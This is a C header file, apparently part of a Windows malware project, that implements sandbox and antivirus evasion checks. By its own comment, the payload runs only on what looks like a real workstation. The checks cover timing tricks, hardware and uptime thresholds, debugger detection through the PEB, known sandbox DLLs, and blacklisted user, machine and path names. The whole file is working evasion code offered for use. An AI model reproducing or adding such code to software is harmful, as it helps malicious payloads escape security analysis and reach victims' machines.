#pragma once
#pragma once

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>

#pragma comment(lib, "Psapi.lib")

// Environmental checks to avoid executing the payload inside
// automated AV/sandbox analysis (e.g. Bitdefender). Returns TRUE
// when the host looks like a real interactive workstation.

static BOOL EnvWcEqualI(WCHAR a, WCHAR b)
{
	if (a >= L'A' && a <= L'Z') a = (WCHAR)(a + 32);
	if (b >= L'A' && b <= L'Z') b = (WCHAR)(b + 32);
	return a == b;
}

static BOOL EnvStrContainsI(LPCWSTR haystack, LPCWSTR needle)
{
	if (!haystack || !needle || !needle[0])
		return FALSE;

	for (LPCWSTR h = haystack; *h; h++) {
		LPCWSTR n = needle;
		LPCWSTR p = h;
		while (*p && *n && EnvWcEqualI(*p, *n)) {
			p++;
			n++;
		}
		if (!*n)
			return TRUE;
	}
	return FALSE;
}

static BOOL EnvModuleLoaded(LPCWSTR moduleName)
{
	HMODULE mods[256];
	DWORD needed = 0;

	if (!EnumProcessModules(GetCurrentProcess(), mods, sizeof(mods), &needed))
		return FALSE;

	DWORD count = needed / sizeof(HMODULE);
	for (DWORD i = 0; i < count; i++) {
		WCHAR name[MAX_PATH] = { 0 };
		if (GetModuleFileNameW(mods[i], name, MAX_PATH)) {
			if (EnvStrContainsI(name, moduleName))
				return TRUE;
		}
	}
	return FALSE;
}

static DWORD EnvCountProcesses(void)
{
	DWORD count = 0;
	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snap == INVALID_HANDLE_VALUE)
		return 0;

	PROCESSENTRY32W pe = { 0 };
	pe.dwSize = sizeof(pe);
	if (Process32FirstW(snap, &pe)) {
		do {
			count++;
		} while (Process32NextW(snap, &pe));
	}

	CloseHandle(snap);
	return count;
}

static BOOL EnvSleepNotAccelerated(void)
{
	const DWORD sleepMs = 1500;
	const DWORD minElapsed = 1200;

	ULONGLONG start = GetTickCount64();
	Sleep(sleepMs);
	ULONGLONG elapsed = GetTickCount64() - start;

	return elapsed >= minElapsed;
}

static BOOL EnvHasEnoughRam(void)
{
	MEMORYSTATUSEX ms = { 0 };
	ms.dwLength = sizeof(ms);
	if (!GlobalMemoryStatusEx(&ms))
		return FALSE;

	return ms.ullTotalPhys >= (2ULL * 1024ULL * 1024ULL * 1024ULL);
}

static BOOL EnvHasEnoughCpus(void)
{
	SYSTEM_INFO si = { 0 };
	GetSystemInfo(&si);
	return si.dwNumberOfProcessors >= 2;
}

static BOOL EnvHasEnoughDisk(void)
{
	ULARGE_INTEGER total = { 0 };
	ULARGE_INTEGER freeAvail = { 0 };
	ULARGE_INTEGER totalFree = { 0 };

	if (!GetDiskFreeSpaceExW(L"C:\\", &freeAvail, &total, &totalFree))
		return FALSE;

	return total.QuadPart >= (50ULL * 1024ULL * 1024ULL * 1024ULL);
}

static BOOL EnvHasEnoughUptime(void)
{
	return GetTickCount64() >= (5ULL * 60ULL * 1000ULL);
}

static BOOL EnvHasEnoughProcesses(void)
{
	return EnvCountProcesses() >= 35;
}

static BOOL EnvScreenLooksReal(void)
{
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	return (w >= 1024 && h >= 768);
}

static BOOL EnvUserInputSeen(void)
{
	LASTINPUTINFO lii = { 0 };
	lii.cbSize = sizeof(lii);
	if (!GetLastInputInfo(&lii))
		return TRUE;

	return lii.dwTime > 0;
}

static BOOL EnvNoDebugger(void)
{
	if (IsDebuggerPresent())
		return FALSE;

	BOOL remote = FALSE;
	if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote) && remote)
		return FALSE;

#ifdef _WIN64
	BYTE* peb = (BYTE*)__readgsqword(0x60);
#else
	BYTE* peb = (BYTE*)__readfsdword(0x30);
#endif
	if (peb && peb[2])
		return FALSE;

	return TRUE;
}

static BOOL EnvNoSandboxArtifacts(void)
{
	static const LPCWSTR kSandboxModules[] = {
		L"sbiedll.dll",
		L"dbgcore.dll",
		L"api_log.dll",
		L"dir_watch.dll",
		L"pstorec.dll",
		L"vmcheck.dll",
		L"wpespy.dll",
		L"cmdvrt32.dll",
		L"cmdvrt64.dll",
		L"snxhk.dll",
	};

	for (size_t i = 0; i < sizeof(kSandboxModules) / sizeof(kSandboxModules[0]); i++) {
		if (EnvModuleLoaded(kSandboxModules[i]))
			return FALSE;
	}

	WCHAR computer[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
	DWORD computerLen = MAX_COMPUTERNAME_LENGTH + 1;
	GetComputerNameW(computer, &computerLen);

	WCHAR user[256] = { 0 };
	DWORD userLen = 256;
	GetUserNameW(user, &userLen);

	static const LPCWSTR kBadNames[] = {
		L"sandbox", L"virus", L"malware", L"sample", L"test",
		L"analysis", L"cuckoo", L"john",
		L"tequilaboomboom", L"fortinet"
	};

	for (size_t i = 0; i < sizeof(kBadNames) / sizeof(kBadNames[0]); i++) {
		if (EnvStrContainsI(computer, kBadNames[i]) || EnvStrContainsI(user, kBadNames[i]))
			return FALSE;
	}

	WCHAR exePath[MAX_PATH] = { 0 };
	if (GetModuleFileNameW(NULL, exePath, MAX_PATH)) {
		if (EnvStrContainsI(exePath, L"\\sample\\") ||
			EnvStrContainsI(exePath, L"\\samples\\") ||
			EnvStrContainsI(exePath, L"\\malware\\") ||
			EnvStrContainsI(exePath, L"\\temp\\bd") ||
			EnvStrContainsI(exePath, L"\\bitdefender\\"))
			return FALSE;
	}

	return TRUE;
}

static BOOL IsRealUserEnvironment(void)
{
	int score = 0;

	if (!EnvSleepNotAccelerated())        score += 2;
	if (!EnvHasEnoughRam())               score += 1;
	if (!EnvHasEnoughCpus())              score += 1;
	if (!EnvHasEnoughDisk())              score += 1;
	if (!EnvHasEnoughUptime())            score += 2;
	if (!EnvHasEnoughProcesses())         score += 1;
	if (!EnvScreenLooksReal())            score += 1;
	if (!EnvUserInputSeen())              score += 1;
	if (!EnvNoDebugger())                 score += 3;
	if (!EnvNoSandboxArtifacts())         score += 3;

	return score < 3;
}
